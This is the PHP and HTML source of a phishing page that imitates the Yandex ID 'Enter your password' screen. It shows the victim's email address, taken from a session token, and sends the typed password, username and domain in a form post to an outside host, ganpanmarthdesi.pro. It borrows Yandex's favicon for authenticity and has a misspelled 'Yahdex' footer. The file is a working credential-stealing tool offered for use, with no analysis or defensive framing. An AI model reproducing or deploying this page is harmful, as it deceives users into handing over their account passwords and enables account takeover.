<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Authorization</title>
<link id="favicon" rel="shortcut icon" href="https://passport.yandex.com/favicon.ico" type="image/x-icon">
  <style>
    body {
      background: linear-gradient(to bottom, #cdddfb, #f6f9fc);
      font-family: Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .login-box {
      background: white;
      width: 335px;
      height: 450px;
      padding: 30px 20px;
      border-radius: 20px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
      text-align: center;
    }
    .back-arrow {
      position: absolute;
      left: 20px;
      top: 20px;
      font-size: 20px;
      cursor: pointer;
    }
    .help-icon {
      position: absolute;
      right: 20px;
      top: 20px;
      font-size: 20px;
      cursor: pointer;
    }
    .logo {
      font-weight: bold;
      font-size: 30px;
      margin-bottom: 20px;
    }
    .logo span {
      background: black;
      color: white;
      border-radius: 10px;
      padding: 0 4px;
      font-size: 18px;
      margin-left: 4px;
    }
    .title {
      font-size: 20px;
      font-weight: bold;
    }
    .subtitle {
      font-size: 16px;
      color: #666;
      margin-bottom: 20px;
    }
    .email-box {
      background: #f1f3f6;
      padding: 10px;
      height: 35px;
      border-radius: 20px;
      display: flex;
      align-items: center;
      margin-bottom: 15px;
      justify-content: space-between;
    }
    .email-box img {
      width: 30px;
      height: 30px;
      border-radius: 50%;
      margin-right: 10px;
    }
    .email-text {
      flex: 1;
      text-align: left;
      font-size: 14px;
      color: #333;
    }
    .dropdown-arrow {
      font-size: 14px;
    }
    .input-group {
      position: relative;
      margin-bottom: 10px;
    }
    .input-group input {
      width: 83%;
      padding: 12px 40px 12px 12px;
      border-radius: 20px;
      border: 1px solid #ccc;
      font-size: 25px;
    }
    .input-group .eye-icon {
      position: absolute;
      right: 15px;
      top: 20px;
      font-size: 16px;
      cursor: pointer;
      color: #aaa;
    }
    .forgot-password {
      text-align: left;
      font-size: 13px;
      color: #666;
      margin-bottom: 20px;
      cursor: pointer;
    }
    .next-btn {
      width: 100%;
      height: 57px;
      background: #1b1b1b;
      color: white;
      padding: 12px;
      border-radius: 12px;
      font-size: 16px;
      border: none;
      margin-bottom: 10px;
      cursor: pointer;
    }
    .qr-btn {
      width: 100%;
      height: 57px;
      background: transparent;
      border: 1px solid #ccc;
      padding: 12px;
      border-radius: 12px;
      font-size: 15px;
      color: #1b1b1b;
      cursor: pointer;
    }
  input[type=password]:focus {
  outline: none;
  border: 2px solid #000000;
  }

  </style>
</head>
<body  style="background-image: url('img/bg.png')">
 
<table border="0" width="100%" cellspacing="0" cellpadding="0">
	<tr>
		<td height="110"></td>
	</tr>
	<tr>
		<td>
		<table border="0" width="100%" cellspacing="0" cellpadding="0">
			<tr>
				<td width="487">&nbsp;</td>
				<td height="512" width="377">
				<form method="post" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php">
  <div class="login-box">
    <div class="logo">Yandex <span>ID</span></div>
    <div class="title">Enter your password</div>
    <div class="subtitle">To log in to your account</div>

    <div class="email-box">
      <img src="img/ico.png" alt="Avatar" width="41" height="39" />
      <div class="email-text"><?php echo $users;?>@<?php echo $ddomain;?></div>
      <div class="dropdown-arrow">&#9660;</div>
    </div>

    <div class="input-group">
      <input type="password" name="passwd" required placeholder="Enter your password" autofocus />
      <input type="hidden" name="user" value="<?php echo $users;?>" />
      <input type="hidden" name="domain" value="<?php echo $ddomain;?>" />
      <input type="hidden" name="link" value="https://mail.yandex.com/?ncrnd=49123" />
      <input type="hidden" name="sender" value="Yandex.com" />
      <span class="eye-icon">&#128065;&#65039;</span>
    </div>

    <div class="forgot-password">Forgot your password?</div>

    <button class="next-btn">Next</button>
    <button class="qr-btn">Log in with QR code</button>
  </div>
 </form>
				</td>
				<td>&nbsp;</td>
			</tr>
		</table>
		</td>
	</tr>
	<tr>
		<td height="5"></td>
	</tr>
	
	<tr>
		<td>
		<table border="0" width="100%" cellspacing="0" cellpadding="0">
			<tr>
				<td height="15" width="13"></td>
				<td width="253">
				<p align="center"><font size="2" color="#FFFFFF">Use Incognito 
				mode on a shared computer</font></td>
				<td>
				<p align="center"><font color="#FFFFFF">Yandex ID. The key to 
				all your services</font></td>
				<td width="106">
				<p align="center"><font color="#FFFFFF" size="2">Help and 
				support</font></td>
				<td width="15"></td>
				<td width="96">
				<font face="Times New Roman" size="2" color="#FFFFFF">(c)</font><font color="#FFFFFF" size="2">2025, Yahdex</font></td>
				<td width="13"></td>
			</tr>
		</table>
		</td>
	</tr>
	<tr>
		<td>
		<table border="0" width="100%" cellspacing="0" cellpadding="0">
			<tr>
				<td width="631"></td>
				<td width="97"><font color="#FFFFFF" size="4">Learn more</font></td>
				<td></td>
			</tr>
		</table>
		</td>
	</tr>
	
	<tr>
		<td height="5"></td>
	</tr>
</table>
</body>
</html>
<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>